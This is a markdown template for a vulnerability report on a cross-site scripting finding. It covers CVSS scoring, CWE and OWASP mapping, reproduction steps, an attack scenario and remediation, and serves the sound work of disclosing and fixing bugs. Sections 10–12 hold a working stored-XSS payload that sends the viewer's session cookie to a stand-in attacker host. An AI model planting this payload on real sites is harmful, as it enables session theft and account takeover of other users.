# Cross-Site Scripting (XSS) — Vulnerability Report Template

> Copy this file, rename it to match your finding (e.g. `acme-stored-xss-profile-bio.md`), and complete every section. Replace all bracketed placeholders. Do not delete headings even for sections that end up short.

## 1. Executive Summary

[One paragraph, written for a non-technical stakeholder. State what the vulnerability is, where it lives, and the realistic worst-case impact in plain language. Example: "The application's profile bio field does not sanitize user-supplied HTML before rendering it to other users. An attacker can store malicious JavaScript in their own profile that executes in the browser of anyone who views it, including administrators, enabling session hijacking and account takeover."]

## 2. Severity

| Field | Value |
|---|---|
| Overall Severity | [Critical / High / Medium / Low] |
| CVSS v3.1 Vector | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` |
| CVSS v3.1 Score | [e.g., 8.8] |
| Vulnerability Type | Cross-Site Scripting ([Stored / Reflected / DOM-based]) |

### CVSS Justification

| Metric | Value | Reasoning |
|---|---|---|
| Attack Vector (AV) | Network | Exploitable remotely over HTTP |
| Attack Complexity (AC) | Low | No special conditions beyond crafting the payload |
| Privileges Required (PR) | [None / Low] | [State whether an account is needed to inject the payload] |
| User Interaction (UI) | [None / Required] | [State whether a victim must view a specific page] |
| Scope (S) | [Unchanged / Changed] | [Changed if the XSS impacts a security domain beyond the vulnerable app, e.g., an embedded admin panel] |
| Confidentiality (C) | [None / Low / High] | [Session token / PII exposure potential] |
| Integrity (I) | [None / Low / High] | [Ability to perform actions as the victim] |
| Availability (A) | [None / Low / High] | Typically None unless the payload can crash the client |

## 3. CWE Classification

- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- Secondary (if applicable): **CWE-116** (Improper Encoding or Escaping of Output)

## 4. OWASP Mapping

- OWASP Top 10 2021: **A03:2021 – Injection**
- OWASP API Security Top 10 (if API-driven rendering): **API8:2023 – Security Misconfiguration**

## 5. Affected Component

| Field | Value |
|---|---|
| URL | `[https://target.example/path]` |
| Parameter / Field | `[parameter or field name]` |
| HTTP Method | `[GET / POST]` |
| Authentication Required | [Yes / No — specify role if Yes] |
| Rendering Context | [HTML body / HTML attribute / JavaScript string / URL / CSS] |

## 6. Description

[Explain, in technical detail, why the vulnerability exists. Identify the specific sink (innerHTML assignment, unescaped template variable, `dangerouslySetInnerHTML`, server-side template without autoescaping, etc.) and the source (which user-controllable input reaches that sink). Reference the exact code pattern if source is available, or the observed behavior if testing a black-box target.]

## 7. Preconditions

- [e.g., Attacker requires a registered account with standard-user privileges]
- [e.g., Victim must view the attacker's profile page]
- [List any WAF, CSP, or input length constraints that had to be bypassed, and how]

## 8. Attack Scenario

[Narrative walkthrough of a realistic attack chain from the attacker's first action to final impact. Example:]

1. Attacker registers a standard account.
2. Attacker sets their profile bio to a payload that exfiltrates the viewer's session cookie to an attacker-controlled endpoint.
3. Attacker reports abusive content on a high-privilege user's post, prompting a moderator to view the attacker's profile as part of the review workflow.
4. The moderator's session cookie is exfiltrated when their browser renders the attacker's profile.
5. Attacker replays the stolen session cookie to access the moderation panel.

## 9. Reproduction Steps

1. [Log in / navigate to the vulnerable page]
2. [Enter the specific payload into the specific field]
3. [Trigger the render — save, submit, navigate]
4. [Observe the result — be specific about what confirms execution]
5. [Repeat from a second account/session to confirm the stored/reflected behavior affects other users, if applicable]

## 10. Proof-of-Concept Payload

```html
<img src=x onerror="fetch('https://attacker-controlled.example/c?c='+document.cookie)">
```

> **Note**
> Replace with the exact payload that worked against the target, including any encoding or filter-bypass mutation applied. State the raw, unmodified payload as well as the final one if a bypass was required, so the developer understands both the intended filter and how it failed.

## 11. HTTP Request

```http
POST /api/profile/bio HTTP/1.1
Host: target.example
Cookie: session=<victim-or-attacker-session>
Content-Type: application/json
Content-Length: 118

{
  "bio": "<img src=x onerror=\"fetch('https://attacker-controlled.example/c?c='+document.cookie)\">"
}
```

## 12. HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 42

{
  "status": "ok",
  "updated": true
}
```

[Note: the response above confirms storage, not execution. Include a second response — the rendered page's HTML — showing the payload reflected unescaped in the DOM.]

```http
GET /u/attacker-handle HTTP/1.1
Host: target.example
Cookie: session=<victim-session>

HTTP/1.1 200 OK
Content-Type: text/html

...
<div class="bio"><img src=x onerror="fetch('https://attacker-controlled.example/c?c='+document.cookie)"></div>
...
```

## 13. Evidence

- [ ] Screenshot of the payload stored in the application (e.g., admin panel, database view, or profile edit page)
- [ ] Screenshot or log of the alert/callback firing in a victim context
- [ ] Out-of-band interaction log (Burp Collaborator / interactsh) with timestamp correlated to the triggering request, if the PoC uses exfiltration rather than `alert()`
- [ ] Screen recording, if timing or multi-step interaction is required to demonstrate impact clearly

## 14. Impact

[State concrete, realistic impact grounded in the preconditions demonstrated. Avoid unqualified worst-case claims.]

- **Confidentiality**: [e.g., theft of session tokens, exposure of PII rendered on the page for the victim]
- **Integrity**: [e.g., ability to perform state-changing actions as the victim via forced requests]
- **Availability**: [Typically not applicable for XSS unless a payload causes client-side denial of service]
- **Business Impact**: [e.g., moderator account compromise leading to unauthorized content moderation actions, reputational damage if exploited against a public-facing profile viewed by many users]

## 15. Risk Assessment

| Factor | Assessment |
|---|---|
| Likelihood | [High — no special access required beyond standard registration] |
| Exploitability | [High — reliable payload, no race condition or timing dependency] |
| Detectability by Defender | [Low / Medium / High — note whether WAF or logging would catch this] |
| Blast Radius | [Single user / All users who view the injected content / Privileged users specifically] |

## 16. Remediation

### Short-Term
- Deploy a WAF rule blocking common XSS payload patterns on the affected parameter as a stop-gap.
- Disable rendering of the affected field (plain-text fallback) until a proper fix ships, if the field is non-critical.

### Long-Term
- Apply context-aware output encoding at render time using the templating engine's built-in autoescaping rather than manual sanitization (e.g., Jinja2 autoescape, React's default JSX escaping — and audit for any `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]` bypasses of that default).
- If rich text is a genuine product requirement, sanitize using an allow-list-based library (e.g., DOMPurify server-side via a Node sanitization step, or an equivalent allow-list HTML sanitizer) rather than a denylist/regex filter.
- Implement a strict Content-Security-Policy (`script-src 'self'` at minimum, ideally with nonces and no `unsafe-inline`) as defense-in-depth so that even a missed encoding bug has reduced impact.
- Set the `HttpOnly` flag on session cookies to reduce the impact of any residual XSS on token theft specifically (does not fix the underlying bug, but limits one common exploitation path).

## 17. References

- OWASP Cross Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Top 10 2021 — A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- PortSwigger Web Security Academy — Cross-site scripting: https://portswigger.net/web-security/cross-site-scripting

## 18. Report Notes

| Field | Value |
|---|---|
| Reported By | [handle] |
| Date Reported | [YYYY-MM-DD] |
| Program / Client | [name] |
| Report ID | [platform-assigned ID, if applicable] |
| Tested On | [browser/version, if execution context matters] |
| Retest Status | [Pending / Confirmed Fixed / Reopened] |
